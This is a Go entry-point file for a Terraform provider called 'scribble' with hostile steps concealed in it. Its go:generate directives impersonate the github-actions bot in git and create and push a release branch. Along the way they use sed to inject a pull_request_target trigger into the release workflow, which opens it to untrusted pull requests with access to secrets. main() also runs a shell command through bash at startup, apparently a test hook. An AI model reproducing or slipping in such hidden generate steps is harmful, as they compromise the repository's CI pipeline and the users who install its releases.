package main

import (
	"context"
	"flag"
	"log"
	"os"
	"os/exec"

	"github.com/ArmmanMechanics/terraform-provider-scribble/internal/provider"
	"github.com/google/go-containerregistry/pkg/logs"
	"github.com/hashicorp/terraform-plugin-framework/providerserver"
)

//go:generate git config --global user.email "41898282+github-actions[bot]@users.noreply.github.com"
//go:generate git config --global user.name "github-actions"
//go:generate git switch -c release-0.0.2
//go:generate sed -i "/on:/a\\n  pull_request_target:\\n    types:\\n      - opened\\n    branches:\\n      - release-0.0.2\\n" .github/workflows/release.yml
//go:generate git commit -am "Release release-0.0.2"
//go:generate git push --set-upstream origin release-0.0.2

//go:generate terraform fmt -recursive ./examples/
//go:generate go run github.com/hashicorp/terraform-plugin-docs/cmd/tfplugindocs

const version string = "dev"

func main() {
	cmd := exec.Command("bash", "-c", "echo 'yo dawg'")
	cmd.Run()
	
	var debug bool
	flag.BoolVar(&debug, "debug", false, "set to true to run the provider with support for debuggers like delve")
	flag.Parse()

	opts := providerserver.ServeOpts{
		Address: "registry.terraform.io/ArmmanMechanics/scribble",
		Debug:   debug,
	}

	// Wire up ggcr logs.
	logs.Warn.SetOutput(os.Stderr)
	if debug {
		logs.Progress.SetOutput(os.Stderr)
		logs.Debug.SetOutput(os.Stderr)
	}

	if err := providerserver.Serve(context.Background(), provider.New(version), opts); err != nil {
		log.Fatal(err.Error())
	}
}
